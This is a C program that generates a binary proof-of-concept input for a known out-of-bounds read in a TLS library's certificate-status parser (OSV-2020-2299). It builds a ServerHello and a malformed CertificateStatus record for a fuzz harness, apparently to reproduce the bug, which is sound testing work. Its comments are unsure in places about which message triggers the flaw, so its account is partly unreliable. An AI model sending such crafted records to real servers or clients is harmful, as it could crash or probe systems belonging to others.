/*
 * gen_poc.c: Generate a binary PoC for OSV-2020-2299
 *
 * The harness creates a TLS client with OCSP stapling and feeds fuzz data
 * as server responses. We need to craft a TLS ServerHello + extensions
 * payload where TLSX_CSR_Parse encounters offset > length, causing the
 * unsigned subtraction to wrap and bypassing the bounds check before ato16.
 *
 * Bug mechanism:
 *   In TLSX_CSR_Parse (src/tls.c), the code does:
 *     if (length - offset < OPAQUE16_LEN) return BUFFER_ERROR;
 *     ato16(input + offset, &size);
 *   When offset > length (both word16), length - offset wraps to ~65533,
 *   the check passes, and ato16 reads 2 bytes past the buffer.
 *
 * Strategy: Craft a TLS 1.2 ServerHello that includes a status_request
 * extension with truncated data, so the parsing advances offset past length.
 *
 * TLS record format:
 *   ContentType(1) | ProtocolVersion(2) | Length(2) | data...
 * ServerHello:
 *   HandshakeType(1) | Length(3) | Version(2) | Random(32) |
 *   SessionIdLen(1) | SessionId(...) | CipherSuite(2) | CompressionMethod(1) |
 *   ExtensionsLen(2) | Extensions...
 *
 * status_request extension (type 0x0005):
 *   ExtType(2) | ExtLen(2) | data...
 *   The CSR response format:
 *     status_type(1) | OCSPResponse length(3) | response...
 */

#include <stdio.h>
#include <string.h>
#include <stdint.h>

static void put16(unsigned char *p, uint16_t v) {
    p[0] = (v >> 8) & 0xFF;
    p[1] = v & 0xFF;
}

static void put24(unsigned char *p, uint32_t v) {
    p[0] = (v >> 16) & 0xFF;
    p[1] = (v >> 8) & 0xFF;
    p[2] = v & 0xFF;
}

int main(int argc, char **argv) {
    const char *outfile = "poc.bin";
    FILE *f;
    unsigned char buf[512];
    int pos = 0;

    if (argc > 1)
        outfile = argv[1];

    f = fopen(outfile, "wb");
    if (!f) {
        perror("fopen");
        return 1;
    }

    /* Build a TLS 1.2 ServerHello with a malformed status_request extension.
     *
     * The extension data for Certificate Status in ServerHello response
     * should contain: status_type(1) + OCSPResponse.
     * But we make it too short so parsing advances offset past the end.
     */

    /* -- ServerHello body -- */
    int sh_start = pos;

    /* HandshakeType: ServerHello (0x02) */
    buf[pos++] = 0x02;
    /* Length placeholder (3 bytes) */
    int sh_len_pos = pos;
    pos += 3;

    /* ProtocolVersion: TLS 1.2 */
    buf[pos++] = 0x03; buf[pos++] = 0x03;

    /* Random (32 bytes of zeros) */
    memset(buf + pos, 0, 32);
    pos += 32;

    /* Session ID length = 0 */
    buf[pos++] = 0x00;

    /* CipherSuite: TLS_RSA_WITH_AES_128_GCM_SHA256 (0x009C) */
    buf[pos++] = 0x00; buf[pos++] = 0x9C;

    /* Compression Method: null (0x00) */
    buf[pos++] = 0x00;

    /* Extensions length placeholder */
    int ext_len_pos = pos;
    pos += 2;
    int ext_start = pos;

    /* status_request extension (type 0x0005) with truncated data.
     * The CertificateStatus message that comes later in the handshake
     * will trigger TLSX_CSR_Parse. But in the ServerHello, the
     * status_request extension indicates the server supports it.
     *
     * For the actual bug, we need to craft a CertificateStatus message
     * where TLSX_CSR_Parse parses OCSP status request data with
     * responder_id_list and request_extensions that overflow.
     */

    /* status_request extension type */
    put16(buf + pos, 0x0005); pos += 2;
    /* Extension data length: 0 (empty in ServerHello is valid) */
    put16(buf + pos, 0x0000); pos += 2;

    /* Update extensions length */
    put16(buf + ext_len_pos, pos - ext_start);

    /* Update ServerHello handshake length */
    put24(buf + sh_len_pos, pos - sh_len_pos - 3);

    /* Wrap in TLS record */
    unsigned char record[512];
    int rpos = 0;
    record[rpos++] = 0x16; /* ContentType: Handshake */
    put16(record + rpos, 0x0303); rpos += 2; /* TLS 1.2 */
    put16(record + rpos, pos); rpos += 2;
    memcpy(record + rpos, buf, pos);
    rpos += pos;

    /* Now add a CertificateStatus message (HandshakeType 0x16 = 22)
     * This is what actually triggers TLSX_CSR_Parse with the OCSP data. */

    /* Build CertificateStatus with malformed OCSP data */
    unsigned char cs_body[32];
    int cs_pos = 0;

    /* status_type: ocsp (1) */
    cs_body[cs_pos++] = 0x01;

    /* OCSP Response: craft responder_id_list length that will cause
     * offset to advance past the actual data.
     * responder_id_list_length = 0x0004 (says 4 bytes follow) */
    put16(cs_body + cs_pos, 0x0004); cs_pos += 2;
    /* But only provide 2 bytes of actual data -> offset advances past end */
    cs_body[cs_pos++] = 0xAA;
    cs_body[cs_pos++] = 0xBB;
    /* request_extensions_length -- this will be read via ato16
     * when offset > length, triggering the OOB read */
    put16(cs_body + cs_pos, 0x0000); cs_pos += 2;

    /* Wrap in Handshake + TLS record */
    unsigned char cs_rec[64];
    int cr_pos = 0;
    cs_rec[cr_pos++] = 0x16; /* Handshake */
    put16(cs_rec + cr_pos, 0x0303); cr_pos += 2;
    /* Handshake header */
    int hs_start = cr_pos;
    /* Total inner = 1 (hs type) + 3 (length) + cs_pos */
    put16(cs_rec + cr_pos, 1 + 3 + cs_pos); cr_pos += 2;
    cs_rec[cr_pos++] = 0x16; /* HandshakeType: CertificateStatus (22) */
    put24(cs_rec + cr_pos, cs_pos); cr_pos += 3;
    memcpy(cs_rec + cr_pos, cs_body, cs_pos);
    cr_pos += cs_pos;

    /* Write the records + method selector byte */
    fwrite(record, 1, rpos, f);
    fwrite(cs_rec, 1, cr_pos, f);

    /* Method selector byte (last byte): 0 = TLS 1.2 */
    unsigned char method_byte = 0x00;
    fwrite(&method_byte, 1, 1, f);

    fclose(f);
    fprintf(stderr, "Generated %s (%d bytes)\n", outfile,
            rpos + cr_pos + 1);
    return 0;
}
